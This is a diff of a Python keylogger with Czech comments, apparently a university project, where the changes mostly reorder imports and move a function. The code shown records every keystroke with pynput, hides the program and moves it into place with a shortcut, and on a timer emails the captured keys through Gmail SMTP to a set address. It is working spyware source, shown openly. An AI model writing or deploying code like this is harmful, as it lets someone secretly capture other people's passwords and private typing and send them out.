@@ -1,14 +1,14 @@
-from pynput.keyboard import Listener   #pro odecitani klaves
-from datetime import datetime
-import smtplib      #pro odesilani mailu
-from email.mime.multipart import MIMEMultipart  #pro format emailu
-from email.mime.text import MIMEText
-from os import system, path     #pro skryti programu a pro ziskani cesty k souboru
+from os import path, system     #pro ziskani cesty k souboru a pro skryti programu
 import sys  #pro ziskani cesty k exe souboru
+from getpass import getuser     #pro ziskani uzivatelskeho jmena prihlaseneho uzivatele
 from shutil import move     #pro presun programu
 from win32com.client import Dispatch    #pro vytvoreni zastupce
-from getpass import getuser     #pro ziskani uzivatelskeho jmena prihlaseneho uzivatele
+from datetime import datetime   #pro ziskani aktualniho data a casu
 from threading import Timer     #pro dalsi vlakno pro casovac pro odesilani mailu
+from email.mime.multipart import MIMEMultipart  #pro format emailu
+from email.mime.text import MIMEText
+from smtplib import SMTP      #pro odesilani mailu
+from pynput.keyboard import Listener   #pro odecitani klaves
 
 log_file = "klog.txt"    #nazev souboru pro ukladani klaves - nevyuzivam    
 file_path = "D:\\Škola\\UNOB\\7. semestr\\Vývoj a správa IS\\Python\\ProjektKeylogger\\"  #cesta k souboru pro ukladani klaves - nevyuzivam
@@ -50,12 +50,12 @@ def press(key):
     #funkce slouzi pro odchytavani stisknutych klaves
     global keys
     print(key)      #vypis klavesu do konzole
-    key = format(key) 
+    key = format(key)
     keys.append(key)    #pripoj stisknutou klavesu do pole klaves
 
 def format(key):
     """Funkce formatuje stisknute klavesy do citelnejsi podoby
-
+    
     Args:
         key (Any): stisknuta klavesa
     
@@ -108,20 +108,12 @@ def mail(formatted_keys, formatted_now):
     message['Subject'] = f"Klog {formatted_now}"   #predmet emailu
     body=''.join(formatted_keys)    #pripojim odchycene klavesy
     message.attach(MIMEText(body, 'plain'))
-    smtp = smtplib.SMTP('smtp.gmail.com', 587)  #pripojeni pomoci SMTP
+    smtp = SMTP('smtp.gmail.com', 587)  #pripojeni pomoci SMTP
     smtp.starttls()     #spusteni TLS pro prihlaseni
     smtp.login(sender, password)    #prihlaseni k emailu
     text = message.as_string()     #celou zpravu prevedu na string
     smtp.sendmail(sender, receiver, text)   #odeslani emailu
     smtp.quit() #ukonceni relace
-
-def release(key):
-    #tuto funkci nevyuzivam, ale muze se hodit
-    #funkce umoznuje nastavit vypnuti odchytavace pri stisknuti urcite klavesy
-    None
-#     #pri stisku Esc se vypne odchytavac
-#     if key == Key.esc:
-#         return False
 
 def measureTime():
     #funkce meri cas a v danem intervalu vola funkci pro odeslani emailu
@@ -136,6 +128,14 @@ def measureTime():
     send_email.daemon = True    #nastavim vlakno casovace jako daemon -> zastavi se spolu s hlavnim vlaknem
     send_email.start()
 
+def release(key):
+    #tuto funkci nevyuzivam, ale muze se hodit
+    #funkce umoznuje nastavit vypnuti odchytavace pri stisknuti urcite klavesy
+    None
+#     #pri stisku Esc se vypne odchytavac
+#     if key == Key.esc:
+#         return False
+
 def listen():
     #funkce pro odchytavani klavesy pri stisku a pri pusteni
     with Listener(on_press = press, on_release = release) as listener:
@@ -145,4 +145,3 @@ if __name__ == "__main__":
     hideProgram()
     measureTime()
     listen()
-    
